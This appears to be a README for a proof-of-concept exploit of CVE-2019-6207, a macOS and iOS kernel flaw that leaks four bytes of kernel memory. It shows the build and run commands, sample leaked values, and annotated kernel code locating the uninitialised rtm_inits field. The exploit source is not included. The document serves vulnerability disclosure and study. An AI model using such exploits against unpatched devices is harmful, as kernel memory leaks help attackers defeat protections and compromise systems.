# CVE-2019-6207 

```
$ clang exploit.c -o exploit
$ ./exploit

CVE-2019-6207 exploit to leak 4 bytes of arbitrary kernel memory
Tested on MacOS 10.14.1, should works on:
MacOS < 10.14.4 ; iOS < 12.2 ; tvOS < 12.2 ; watchOS < 5.2

Buffer length = 0x188
rt_msghdr.rtm_inits (+0x20): 0x00001000
rt_msghdr.rtm_inits (+0x20): 0x0075002F
rt_msghdr.rtm_inits (+0x20): 0x119F2000
rt_msghdr.rtm_inits (+0x20): 0x119F2000
rt_msghdr.rtm_inits (+0x20): 0x119F2000
rt_msghdr.rtm_inits (+0x20): 0x5A0201D1
rt_msghdr.rtm_inits (+0x20): 0x0889B000
rt_msghdr.rtm_inits (+0x20): 0xDEADBEEF
rt_msghdr.rtm_inits (+0x20): 0x119F2000
rt_msghdr.rtm_inits (+0x20): 0x6573752F
rt_msghdr.rtm_inits (+0x20): 0x119F5000
rt_msghdr.rtm_inits (+0x20): 0x119F5000
```

# Vulnerability

```cpp
static int sysctl_dumpentry(struct radix_node *rn, void *vw) {
  if (w->w_op != NET_RT_DUMP2) {
    int size = rt_msg2(RTM_GET, &info, NULL, w, credp); 
    if (w->w_req != NULL && w->w_tmem != NULL) {
      struct rt_msghdr *rtm =
          (struct rt_msghdr *)(void *)w->w_tmem; // memory not init

      rtm->rtm_flags = rt->rt_flags;
      rtm->rtm_use = rt->rt_use;
      rt_getmetrics(rt, &rtm->rtm_rmx);
      rtm->rtm_index = rt->rt_ifp->if_index;
      rtm->rtm_pid = 0;
      rtm->rtm_seq = 0;
      rtm->rtm_errno = 0;
      rtm->rtm_addrs = info.rti_addrs;
      // rtm->rtm_inits not init
      error = SYSCTL_OUT(w->w_req, (caddr_t)rtm, size); // leak to the userland
    }
  }
}

static int rt_msg2(/* ... */ struct walkarg *w) {
  //...
  // Allocation of `w_tmem` but no initialisation
  rw->w_tmem = _MALLOC(len, M_RTABLE, M_WAITOK); 
  //...
}
```